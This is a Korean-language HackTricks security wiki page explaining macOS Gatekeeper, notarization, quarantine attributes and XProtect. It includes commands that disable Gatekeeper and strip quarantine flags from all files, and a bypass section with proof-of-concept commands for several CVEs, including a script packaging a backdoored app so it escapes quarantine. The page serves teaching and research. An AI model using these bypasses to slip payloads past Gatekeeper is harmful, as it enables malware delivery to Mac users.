# macOS Gatekeeper / Quarantine / XProtect

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>에서 <strong>제로에서 영웅까지 AWS 해킹 배우기</strong>를 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하거나 **PEASS의 최신 버전에 액세스**하거나 **HackTricks를 PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **해킹 트릭을 공유하려면 PR을** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **에 제출**하세요.
*
* .

</details>

## Gatekeeper

**Gatekeeper**는 Mac 운영 체제를 위해 개발된 보안 기능으로, 사용자가 시스템에서 **신뢰할 수 있는 소프트웨어만 실행**하도록 보장합니다. 이 기능은 사용자가 앱 스토어 외부의 소스에서 다운로드하고 열려고 하는 소프트웨어(앱, 플러그인, 설치 프로그램 등)를 **검증**함으로써 작동합니다.

Gatekeeper의 핵심 메커니즘은 **검증** 과정에 있습니다. 다운로드한 소프트웨어가 **인증된 개발자에 의해 서명**되었는지 확인하여 소프트웨어의 신뢰성을 보장합니다. 또한, 소프트웨어가 **Apple에 의해 인증**되었는지 확인하여 알려진 악성 콘텐츠가 없으며 인증 이후에 변경되지 않았음을 확인합니다.

게다가, Gatekeeper는 사용자의 제어와 보안을 강화하기 위해 다운로드한 소프트웨어의 처음 실행을 **사용자에게 승인 요청**하는 방식으로 작동합니다. 이 보호 기능은 사용자가 해로운 실행 가능한 코드를 무심코 해방 파일로 오인할 수 있는 상황을 방지하는 데 도움을 줍니다.

### 애플리케이션 서명

애플리케이션 서명 또는 코드 서명은 Apple의 보안 인프라의 중요한 구성 요소입니다. 이를 통해 소프트웨어 작성자(개발자)의 **신원을 확인**하고 마지막으로 서명된 이후에 코드가 변경되지 않았는지 확인합니다.

작동 방식은 다음과 같습니다:

1. **애플리케이션 서명:** 개발자가 애플리케이션을 배포할 준비가 되면, **개인 키를 사용하여 애플리케이션에 서명**합니다. 이 개인 키는 개발자가 Apple 개발자 프로그램에 등록할 때 Apple이 개발자에게 발급하는 **인증서와 관련**되어 있습니다. 서명 프로세스는 앱의 모든 부분에 대한 암호화 해시를 생성하고 이 해시를 개발자의 개인 키로 암호화하는 것을 포함합니다.
2. **애플리케이션 배포:** 서명된 애플리케이션은 사용자에게 개발자의 인증서와 함께 배포됩니다. 이 인증서에는 해당하는 공개 키가 포함되어 있습니다.
3. **애플리케이션 확인:** 사용자가 애플리케이션을 다운로드하고 실행하려고 할 때, Mac 운영 체제는 개발자의 인증서에서 공개 키를 사용하여 해시를 복호화합니다. 그런 다음 애플리케이션의 현재 상태를 기반으로 해시를 다시 계산하고 이를 복호화된 해시와 비교합니다. 일치하는 경우, 개발자가 서명한 이후로 **애플리케이션이 변경되지 않았음**을 의미하며 시스템은 애플리케이션을 실행할 수 있도록 허용합니다.

애플리케이션 서명은 Apple의 Gatekeeper 기술의 중요한 부분입니다. 사용자가 **인터넷에서 다운로드한 애플리케이션을 열려고 할 때**, Gatekeeper는 애플리케이션 서명을 확인합니다. Apple이 알려진 개발자에게 발급한 인증서로 서명되었고 코드가 변경되지 않았다면, Gatekeeper는 애플리케이션을 실행할 수 있도록 허용합니다. 그렇지 않으면, 애플리케이션을 차단하고 사용자에게 경고를 표시합니다.

macOS Catalina부터는 **Gatekeeper는 애플에 의해 인증**된지 여부도 확인합니다. 인증 프로세스는 애플리케이션을 알려진 보안 문제와 악성 코드에 대해 검사하고 이러한 검사를 통과하면 애플이 Gatekeeper가 확인할 수 있는 티켓을 애플리케이션에 추가합니다.

#### 서명 확인

악성 코드 샘플을 확인할 때는 항상 이진 파일의 **서명을 확인**해야 합니다. 서명한 **개발자**가 이미 **악성 코드와 관련**되어 있을 수 있기 때문입니다.
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### Notarization

애플의 노타리제이션 프로세스는 사용자가 잠재적으로 해로운 소프트웨어로부터 보호되는 추가적인 안전장치로 작용합니다. 이 프로세스는 개발자가 애플의 노타리 서비스에 소프트웨어를 제출하는 것을 포함하며, 이는 앱 리뷰와 혼동해서는 안 됩니다. 이 서비스는 악성 콘텐츠와 코드 서명에 관련된 잠재적인 문제를 확인하기 위해 제출된 소프트웨어를 자동으로 검토하는 시스템입니다.

소프트웨어가 이러한 검토를 거쳐 문제가 없다고 판단되면, 노타리 서비스는 노타리제이션 티켓을 생성합니다. 그런 다음, 개발자는 이 티켓을 소프트웨어에 첨부해야 하는데, 이 과정을 '스테이플링'이라고 합니다. 노타리제이션 티켓은 또한 온라인에도 게시되어 게이트키퍼(Gatekeeper), 애플의 보안 기술,에서 액세스할 수 있습니다.

사용자가 소프트웨어를 처음 설치하거나 실행할 때, 실행 파일에 첨부되어 있거나 온라인에서 찾을 수 있는 노타리제이션 티켓의 존재는 게이트키퍼에게 소프트웨어가 애플에 의해 노타리제이션된 것임을 알려줍니다. 결과적으로, 게이트키퍼는 초기 실행 대화 상자에 설명적인 메시지를 표시하여 소프트웨어가 애플에 의해 악성 콘텐츠에 대한 검사를 받았음을 알려줍니다. 이 프로세스는 사용자가 시스템에 설치하거나 실행하는 소프트웨어의 보안에 대한 신뢰도를 향상시킵니다.

### GateKeeper 열거

GateKeeper는 신뢰할 수 없는 앱의 실행을 방지하는 여러 보안 구성 요소와 동시에 하나의 구성 요소입니다.

GateKeeper의 상태를 확인하는 것이 가능합니다:
```bash
# Check the status
spctl --status
```
{% hint style="danger" %}
GateKeeper 서명 검사는 **격리 속성을 가진 파일**에 대해서만 수행됩니다. 모든 파일에 대해서는 수행되지 않습니다.
{% endhint %}

GateKeeper는 **환경 설정 및 서명**에 따라 이진 파일을 실행할 수 있는지 확인합니다:

<figure><img src="../../../.gitbook/assets/image (678).png" alt=""><figcaption></figcaption></figure>

이 구성을 유지하는 데이터베이스는 **`/var/db/SystemPolicy`**에 위치합니다. 다음 명령을 root로 실행하여 이 데이터베이스를 확인할 수 있습니다:
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
첫 번째 규칙이 "**App Store**"로 끝나고 두 번째 규칙이 "**Developer ID**"로 끝났음을 주목하세요. 그리고 이전 이미지에서는 **App Store 및 식별된 개발자로부터 앱을 실행할 수 있도록** 설정되어 있었습니다.\
만약 그 설정을 App Store로 **변경**하면 "**Notarized Developer ID" 규칙이 사라집니다**.

또한 **GKE 유형의 수천 개의 규칙**이 있습니다.
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
다음은 **`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`, `/var/db/gke.bundle/Contents/Resources/gk.db`** 및 **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`**에서 가져온 해시입니다.

또는 이전 정보를 다음과 같이 나열할 수도 있습니다:
```bash
sudo spctl --list
```
**`spctl`**의 **`--master-disable`**와 **`--global-disable`** 옵션은 이러한 서명 검사를 완전히 **비활성화**합니다:
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
완전히 활성화되면 새로운 옵션이 나타납니다:

<figure><img src="../../../.gitbook/assets/image (679).png" alt=""><figcaption></figcaption></figure>

GateKeeper로 **앱이 허용될지 확인**할 수 있습니다.
```bash
spctl --assess -v /Applications/App.app
```
GateKeeper에 새로운 규칙을 추가하여 특정 앱의 실행을 허용할 수 있습니다. 다음과 같이 진행할 수 있습니다:
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
### 격리 파일

애플리케이션 또는 파일을 다운로드하면 macOS의 웹 브라우저나 이메일 클라이언트와 같은 특정 애플리케이션은 다운로드한 파일에 "**격리 플래그**"라고 알려진 확장 파일 속성을 부착합니다. 이 속성은 파일을 신뢰할 수 없는 출처(인터넷)에서 가져온 것으로 표시하고 잠재적인 위험을 가질 수 있으므로 보안 조치로 작동합니다. 그러나 일부 애플리케이션은 이 속성을 부착하지 않습니다. 예를 들어, 일반적인 BitTorrent 클라이언트 소프트웨어는 이 프로세스를 우회합니다.

**격리 플래그가 없는 경우**(일부 BitTorrent 클라이언트를 통해 다운로드된 파일과 같은 경우), 사용자가 파일을 실행하려고 할 때 macOS의 Gatekeeper 보안 기능에 신호를 보냅니다.

격리 플래그가 없는 경우 Gatekeeper의 검사가 수행되지 않을 수 있습니다. 따라서 사용자는 보안이 적은 또는 알려지지 않은 출처에서 다운로드한 파일을 열 때 주의해야 합니다.

{% hint style="info" %}
코드 서명의 **유효성**을 확인하는 것은 코드와 모든 번들된 리소스의 암호화 해시를 생성하는 등 **리소스를 많이 사용하는 프로세스**입니다. 또한 인증서의 유효성을 확인하기 위해서는 발급 후에 취소되었는지 Apple의 서버에 온라인으로 확인해야 합니다. 이러한 이유로 전체 코드 서명 및 인증 검사는 **앱이 실행될 때마다 실행하기에는 비현실적**입니다.

따라서 이러한 검사는 **격리 속성이 있는 앱을 실행할 때만 실행**됩니다.
{% endhint %}

{% hint style="warning" %}
이 속성은 파일을 생성/다운로드하는 애플리케이션에 의해 **설정**되어야 합니다.

그러나 샌드박스에 있는 파일은 생성하는 모든 파일에 이 속성이 설정됩니다. 샌드박스가 없는 앱은 이 속성을 직접 설정하거나 **Info.plist**에 [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/lsfilequarantineenabled?language=objc) 키를 지정하여 시스템이 생성된 파일에 `com.apple.quarantine` 확장 속성을 설정하도록 할 수 있습니다.
{% endhint %}

다음과 같이 상태를 **확인하고 활성화/비활성화**할 수 있습니다(루트 권한 필요):
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
다음과 같이 **파일이 격리 확장 속성을 가지고 있는지 확인**할 수도 있습니다:

```bash
xattr -p com.apple.quarantine <file_path>
```

이 명령은 `<file_path>`에 지정된 파일의 `com.apple.quarantine` 속성을 출력합니다.
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
**확장 속성**의 **값**을 확인하고 다음과 같이 quarantine 속성을 작성한 앱을 찾습니다.
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
실제로 프로세스는 생성하는 파일에 격리 플래그를 설정할 수 있습니다 (생성된 파일에 USER_APPROVED 플래그를 적용해 보았지만 적용되지 않았습니다):

<details>

<summary>격리 플래그 적용 소스 코드</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</details>

그리고 다음과 같이 그 속성을 **제거**하십시오:
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
다음 명령어를 사용하여 모든 격리된 파일을 찾으세요:

{% code overflow="wrap" %}
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
{% endcode %}

Quarantine 정보는 LaunchServices가 관리하는 중앙 데이터베이스인 **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`**에 저장됩니다.

#### **Quarantine.kext**

커널 확장은 시스템의 커널 캐시를 통해서만 사용할 수 있습니다. 그러나 **https://developer.apple.com/**에서 **Kernel Debug Kit**을 다운로드하여 커널 확장의 심볼화된 버전을 얻을 수 있습니다.

### XProtect

XProtect는 macOS에 내장된 **안티-악성코드** 기능입니다. XProtect는 알려진 악성코드 및 위험한 파일 유형의 데이터베이스와 비교하여 애플리케이션이 처음 실행되거나 수정될 때마다 해당 애플리케이션을 확인합니다. Safari, Mail, 또는 Messages와 같은 특정 앱을 통해 파일을 다운로드할 때 XProtect가 자동으로 파일을 스캔합니다. 데이터베이스에 알려진 악성코드와 일치하는 경우, XProtect는 파일 실행을 **차단하고 위협을 알립니다**.

XProtect 데이터베이스는 애플에서 정기적으로 업데이트되며, 이러한 업데이트는 자동으로 Mac에 다운로드되고 설치됩니다. 이를 통해 XProtect가 항상 최신 알려진 위협과 함께 업데이트되도록 보장됩니다.

그러나 XProtect는 **완전한 기능을 갖춘 백신 솔루션은 아닙니다**. XProtect는 특정 알려진 위협 목록만 확인하며 대부분의 백신 소프트웨어와 같이 온액세스 스캐닝을 수행하지 않습니다.

최신 XProtect 업데이트에 대한 정보를 얻으려면 다음을 실행합니다:

{% code overflow="wrap" %}
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
{% endcode %}

XProtect는 SIP로 보호된 위치인 **/Library/Apple/System/Library/CoreServices/XProtect.bundle**에 위치하며, 번들 내부에서 XProtect가 사용하는 정보를 찾을 수 있습니다:

* **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: 이 cdhash를 가진 코드가 레거시 entitlement를 사용할 수 있도록 허용합니다.
* **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: BundleID 및 TeamID 또는 최소 버전을 나타내는 플러그인 및 확장 기능의 목록입니다.
* **`XProtect.bundle/Contents/Resources/XProtect.yara`**: 악성 코드를 감지하기 위한 Yara 규칙입니다.
* **`XProtect.bundle/Contents/Resources/gk.db`**: 차단된 응용 프로그램 및 TeamID의 해시를 포함하는 SQLite3 데이터베이스입니다.

XProtect와 관련된 다른 앱인 **`/Library/Apple/System/Library/CoreServices/XProtect.app`**도 있지만, 이 앱은 Gatekeeper 프로세스와 관련이 없습니다.

### Gatekeeper가 아닌 것들

{% hint style="danger" %}
Gatekeeper는 애플리케이션을 실행할 때마다 실행되는 것이 아니라, 이미 Gatekeeper에 의해 실행 및 확인된 앱을 실행할 때에만 _**AppleMobileFileIntegrity**_ (AMFI)가 실행되어 실행 가능한 코드 서명을 확인합니다.
{% endhint %}

따라서 이전에는 앱을 실행하여 Gatekeeper로 캐시한 다음 (Electron asar 또는 NIB 파일과 같은) 실행 불가능한 파일을 수정하고 다른 보호 기능이 없는 경우, 애플리케이션에 악성 추가 요소가 포함된 채로 **실행**할 수 있었습니다.

그러나 이제는 macOS가 애플리케이션 번들 내의 파일 수정을 방지합니다. 따라서 [Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md) 공격을 시도하면 번들을 수정할 수 없으므로 이를 악용할 수 없음을 알 수 있습니다. 예를 들어 Contents 디렉토리의 이름을 NotCon으로 변경한 다음 Gatekeeper로 앱을 캐시하기 위해 앱의 주 실행 파일을 실행하면 오류가 발생하여 실행되지 않습니다.

## Gatekeeper 우회

Gatekeeper를 우회하는 방법(사용자가 무언가를 다운로드하고 Gatekeeper가 금지해야 할 때 실행되도록 만드는 방법)은 macOS에서 취약점으로 간주됩니다. 다음은 과거에 Gatekeeper 우회를 허용한 기술에 할당된 일부 CVE입니다:

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

**Archive Utility**를 사용하여 압축을 푸는 경우, **경로가 886자를 초과하는 파일**은 com.apple.quarantine 확장 속성을 받지 않습니다. 이로 인해 이러한 파일이 **Gatekeeper의** 보안 검사를 우회할 수 있게 됩니다.

자세한 정보는 [**원본 보고서**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)를 확인하세요.

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

**Automator**로 생성된 애플리케이션의 실행에 필요한 정보는 `application.app/Contents/document.wflow`에 있으며, 실행 파일에는 해당 정보가 없습니다. 실행 파일은 단순히 **Automator Application Stub**라는 일반적인 Automator 이진 파일입니다.

따라서 `application.app/Contents/MacOS/Automator\ Application\ Stub`을 다른 시스템 내부의 Automator Application Stub로 심볼릭 링크로 지정하면 `document.wflow`(스크립트) 내부의 내용이 실행되며, 실제 실행 파일에는 quarantine xattr이 없으므로 Gatekeeper가 트리거되지 않습니다.&#x20;

예상 위치의 예: `/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

자세한 정보는 [**원본 보고서**](https://ronmasas.com/posts/bypass-macos-gatekeeper)를 확인하세요.

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

이 우회에서는 압축을 시작하는 위치를 `application.app/Contents`가 아닌 `application.app`에서 시작하는 zip 파일이 생성되었습니다. 따라서 **quarantine 속성**은 `application.app/Contents`의 **모든 파일에 적용**되었지만 `application.app`에는 적용되지 않았으며, Gatekeeper가 확인하는 대상이었습니다. 따라서 `application.app`이 트리거될 때 **quarantine 속성이 없었기 때문에** Gatekeeper가 우회되었습니다.
```bash
zip -r test.app/Contents test.zip
```
[**원본 보고서**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)에서 자세한 정보를 확인하세요.

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

이 취약점의 악용은 이전과 매우 유사하지만 구성 요소는 다릅니다. 이 경우에는 **`application.app/Contents`**에서 Apple Archive를 생성하여 **Archive Utility**에 의해 압축이 풀릴 때 **`application.app`에 대한 quarantine 속성이 설정되지 않습니다**.
```bash
aa archive -d test.app/Contents -o test.app.aar
```
자세한 정보는 [**원본 보고서**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/)를 확인하세요.

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

ACL **`writeextattr`**은 파일의 속성을 쓰지 못하도록 막을 수 있습니다:
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
또한, **AppleDouble** 파일 형식은 ACE를 포함하여 파일을 복사합니다.

[**소스 코드**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)에서는 xattr인 **`com.apple.acl.text`**에 저장된 ACL 텍스트 표현이 압축 해제된 파일에 ACL로 설정됩니다. 따라서, 다른 xattr이 쓰여지지 않도록 ACL을 가진 애플리케이션을 **AppleDouble** 파일 형식으로 압축한 경우... quarantine xattr이 애플리케이션에 설정되지 않았습니다:

{% code overflow="wrap" %}
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
{% endcode %}

추가 정보는 [**원본 보고서**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)에서 확인할 수 있습니다.

AppleArchives를 사용하여 이 취약점을 악용할 수도 있습니다:
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

구글 크롬이 macOS 내부 문제로 인해 다운로드된 파일에 **격리 속성을 설정하지 않았다**는 것이 발견되었습니다.

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

AppleDouble 파일 형식은 파일의 속성을 `._`로 시작하는 별도의 파일에 저장하여 macOS 기기 간에 파일 속성을 복사하는 데 도움이 됩니다. 그러나 AppleDouble 파일을 압축 해제한 후 `._`로 시작하는 파일에는 **격리 속성이 지정되지 않았다**는 것이 관찰되었습니다.

{% code overflow="wrap" %}
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
{% endcode %}

게이트키퍼를 우회할 수 있도록 **격리 속성이 설정되지 않은 파일을 생성**할 수 있다면, **가능합니다.** 이 기교는 AppleDouble 이름 규칙을 사용하여 DMG 파일 응용 프로그램을 **생성**하고 격리 속성이 없는 **숨겨진** 파일에 대한 가시적인 파일을 심볼릭 링크로 생성하는 것입니다.\
**DMG 파일이 실행**되면, 격리 속성이 없으므로 **게이트키퍼를 우회**합니다.
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### Quarantine xattr 예방

".app" 번들에서 quarantine xattr이 추가되지 않으면 실행 시 **Gatekeeper가 작동하지 않습니다**.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 **팔로우**하세요 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
